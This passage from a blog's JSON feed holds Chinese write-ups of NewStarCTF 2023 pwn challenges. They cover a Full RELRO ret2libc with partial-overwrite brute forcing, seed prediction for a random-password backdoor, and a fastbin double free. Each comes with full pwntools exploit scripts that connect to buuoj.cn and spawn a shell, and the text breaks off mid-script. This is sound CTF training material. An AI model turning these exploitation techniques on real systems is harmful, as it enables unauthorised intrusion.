data-num=\"62\"></td><td><pre>\tpin<span class=\"token operator\">+=</span>getpin<span class=\"token punctuation\">(</span>pin<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"PIN:\"</span><span class=\"token punctuation\">,</span>pin<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre></pre></td></tr><tr><td data-num=\"65\"></td><td><pre><span class=\"token comment\">#后面没用了 懒得写跳转</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token string\">b\"123456\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">b'>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token string\">b'2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"no_ouput\"><a class=\"markdownIt-Anchor\" href=\"#no_ouput\">#</a> no_ouput</h2>\n<p>full_RELRO ret2libc</p>\n<p>这道题开了 Full RELRO 保护，got 表一开始就已经填完并且只读了。但是没有开 PIE，要利用程序本身已有的代码还是很方便的。</p>\n<p><img data-src=\"./image-20231031224624377.png\" alt=\"image-20231031224624377\"></p>\n<p>同时，程序没有输出函数，got 表只有 read 和 setvbuf。主程序中 read 函数可以进行栈溢出。</p>\n<img data-src=\"./image-20231031224856598.png\" alt=\"image-20231031224856598\" style=\"zoom:50%;\" />\n<img data-src=\"./image-20231031224746063.png\" alt=\"image-20231031224746063\" style=\"zoom: 67%;\" />\n<h3 id=\"漏洞\"><a class=\"markdownIt-Anchor\" href=\"#漏洞\">#</a> 漏洞</h3>\n<p>主函数在执行 read 函数后，将 read 函数的真实地址赋给了名为 a 的全局变量。这时候，虽然没有输出函数，但因为 write 函数和 read 函数在 libc 中相邻很近，我们便可以通过只修改 a 的最低两位，然后跳到 write 函数，利用其泄露 libc 地址。</p>\n<img data-src=\"./image-20231031224806243.png\" alt=\"image-20231031224806243\" style=\"zoom:50%;\" />\n<img data-src=\"./image-20231031224829366.png\" alt=\"image-20231031224829366\" style=\"zoom:50%;\" />\n<h3 id=\"利用\"><a class=\"markdownIt-Anchor\" href=\"#利用\">#</a> 利用</h3>\n<p>首先栈溢出，返回到 read 函数，设置写入位置为 a 的地址。真实地址低 3 位固定，第 4 位随机，所以需要爆破。</p>\n<p>随后利用 csu 调用 a 处储存的地址，以及配置相关参数。这里便是调用 write 函数，输出的内容为 a，即为 write 的真实地址，然后返回 main 函数。</p>\n<p>利用 write 地址算出 system 地址和 <code>&quot;/bin/sh&quot;</code>  地址，再次溢出，getshell。</p>\n<p><img data-src=\"./image-20231031230042309.png\" alt=\"image-20231031230042309\"></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">,</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>mode <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    mode <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">if</span> mode <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    libc<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./libc-2.31.so'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    libc<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'/glibc-all-in-one/2.31-0ubuntu9.7_amd64/libc.so.6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn_pe'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>write_la <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'write'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x070</span> <span class=\"token operator\">+</span> <span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>main_a <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>read_p <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'read'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>prdi <span class=\"token operator\">=</span> <span class=\"token number\">0x0401253</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>rsi_r15 <span class=\"token operator\">=</span> <span class=\"token number\">0x401251</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>ret <span class=\"token operator\">=</span> <span class=\"token number\">0x040101a</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>target <span class=\"token operator\">=</span> <span class=\"token number\">0x404050</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>csu_front_addr <span class=\"token operator\">=</span> <span class=\"token number\">0x0401230</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>csu_end_addr <span class=\"token operator\">=</span> <span class=\"token number\">0x040124a</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">csu</span><span class=\"token punctuation\">(</span>rbx<span class=\"token punctuation\">,</span> rbp<span class=\"token punctuation\">,</span> r12<span class=\"token punctuation\">,</span> r13<span class=\"token punctuation\">,</span> r14<span class=\"token punctuation\">,</span> r15<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token comment\"># pop rbx,rbp,r12,r13,r14,r15</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token comment\"># rbx should be 0,</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token comment\"># rbp should be 1,enable not to jump</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token comment\"># r15 should be the function we want to call</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token comment\"># rdi=edi=r12d</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token comment\"># rsi=r13</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token comment\"># rdx=r14</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    payload <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span>csu_end_addr<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>rbx<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>rbp<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>r12<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>r13<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>r14<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>r15<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>csu_front_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    payload <span class=\"token operator\">+=</span> <span class=\"token string\">b'a'</span> <span class=\"token operator\">*</span> <span class=\"token number\">0x38</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token keyword\">return</span> payload</pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>by<span class=\"token operator\">=</span><span class=\"token number\">0</span> </pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>by<span class=\"token operator\">&lt;</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token keyword\">if</span> mode <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">26547</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        p<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn_pe'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    payload <span class=\"token operator\">=</span> offset <span class=\"token operator\">*</span> <span class=\"token string\">b'a'</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>rsi_r15<span class=\"token punctuation\">)</span>  <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>read_p<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    payload <span class=\"token operator\">+=</span> csu<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>target<span class=\"token punctuation\">,</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span>target<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>main_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    <span class=\"token keyword\">if</span> mode<span class=\"token operator\">==</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">'pause'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.02</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>        payload <span class=\"token operator\">=</span> p8<span class=\"token punctuation\">(</span>write_la<span class=\"token operator\">&amp;</span><span class=\"token number\">0xff</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p8<span class=\"token punctuation\">(</span>by<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>        p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>        write_a <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\n\\n[+] the write addrees is %#x'</span><span class=\"token operator\">%</span>write_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>        <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>        p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>        by<span class=\"token operator\">+=</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>mode<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span><span class=\"token string\">'b read'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>libcbase <span class=\"token operator\">=</span> write_a <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'write'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>sys_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>bs_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">b'/bin/sh'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span>offset <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>prdi<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>bs_a<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>sys_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"planet\"><a class=\"markdownIt-Anchor\" href=\"#planet\">#</a> planet</h2>\n<p>random cdll</p>\n<h3 id=\"分析\"><a class=\"markdownIt-Anchor\" href=\"#分析\">#</a> 分析</h3>\n<p>程序大概是一个模拟星际旅行的程序。其中，星球之间利用链表管理。有个类似菜单的功能函数，其中包括后门函数。星球名称和后门函数的验证密码均用随机数模 26 然后从字母表中选值。</p>\n<p><img data-src=\"./image-20231031230422500.png\" alt=\"image-20231031230422500\"></p>\n<h3 id=\"利用-2\"><a class=\"markdownIt-Anchor\" href=\"#利用-2\">#</a> 利用</h3>\n<p>与 week1 的 random 思路相同。</p>\n<p>程序利用 <code>time(0)</code>  作为随机数种子，因此利用 cdll 库函数，在程序执行 <code>srand(time(0))</code>  时同步执行，即可获得与之相同的随机种子。</p>\n<p>先生成 <code>11*5=55</code>  个随机数，对应 11 课星球的名称。然后接下来的 30 位即为后门函数的密码。调用后门函数，输入计算出来的密码，直接 getshell。</p>\n<p><img data-src=\"./image-20231031231206354.png\" alt=\"image-20231031231206354\"></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> ctypes <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>e<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#p=process('./pwn')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>e<span class=\"token operator\">=</span>cdll<span class=\"token punctuation\">.</span>LoadLibrary<span class=\"token punctuation\">(</span><span class=\"token string\">'libc.so.6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">29021</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b ')</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>password <span class=\"token operator\">=</span> <span class=\"token string\">b'secret_passwd_anti_bad_guys'</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Passwd: '</span><span class=\"token punctuation\">,</span>password<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>e<span class=\"token punctuation\">.</span>srand<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token operator\">*</span><span class=\"token number\">11</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    e<span class=\"token punctuation\">.</span>rand<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'What is your next move? (Help)\\n>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'Admin'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b''</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">30</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    payload <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">97</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span>rand<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token number\">26</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Insert the secret passwd\\n> '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'the passwd is: '</span> <span class=\"token operator\">+</span> payload<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'The command to exec\\n> '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'/bin/sh\\0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": [
                "random",
                "cdll",
                "侧信道攻击",
                "时间差",
                "full RELRO",
                "brop"
            ]
        },
        {
            "id": "http://waltcsz.github.io/2023/10/newstarctf2023-week4/",
            "url": "http://waltcsz.github.io/2023/10/newstarctf2023-week4/",
            "title": "newstarctf2023 week4",
            "date_published": "2023-10-19T17:20:21.000Z",
            "content_html": "<h1 id=\"newstartctf2023_week4-pwn\"><a class=\"markdownIt-Anchor\" href=\"#newstartctf2023_week4-pwn\">#</a> newstartctf2023_week4 pwn</h1>\n<h2 id=\"double\"><a class=\"markdownIt-Anchor\" href=\"#double\">#</a> Double</h2>\n<p>堆 heap, double_free, fastbin</p>\n<p>libc: 2.23</p>\n<p>程序中功能选择只有创建 <code>add()</code> ，删除 <code>del()</code>  和检查 <code>check()</code> 。其中， <code>check()</code>  内存在后门函数，只要 0x602070 处的值为 1638，即可直接 getsshell。</p>\n<p>其次， <code>del()</code>  中释放块后没有清除指针，可以进行 double free。因此只要在 0x602070 处伪造块，并设置值为 1638。</p>\n<p><code>add()</code>  中固定分配 0x28 大小的块，并且同时写入内容。释放后进入 fastbin。</p>\n<blockquote>\n<p>实际占用 0x30 空间，释放后进入 fastbin [1]</p>\n</blockquote>\n<h3 id=\"步骤\"><a class=\"markdownIt-Anchor\" href=\"#步骤\">#</a> 步骤</h3>\n<p>分配 2 个 chunk，序号分别为 0、1，然后按 0、1、0 的顺序释放 chunk，这样 0 号 chunk 在 fastbin 中存在 2 次构成闭环。</p>\n<pre><code>fastbin[1] -&gt; chunk0 -&gt; chunk1 -&gt; chunk0 (-&gt;chunk1)\n</code></pre>\n<p>再次分配一个块，此时分配到 0 号 chunk，在其中输入 0x602070 的编码。此时 fastbin [1] 中即为：</p>\n<pre><code>fastbin[1] -&gt; chunk1 —&gt; chunk0 -&gt; 0x602070\n</code></pre>\n<p>再分配 3 次，在第 3 次时输入内容 1638，然后选择进入 <code>check()</code> 。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">25043</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process('./Double_pe')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b *0x400B3C')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>target <span class=\"token operator\">=</span> <span class=\"token number\">0x602070</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>num <span class=\"token operator\">=</span> <span class=\"token number\">1638</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">choose</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'>\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">mal</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Input idx\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token 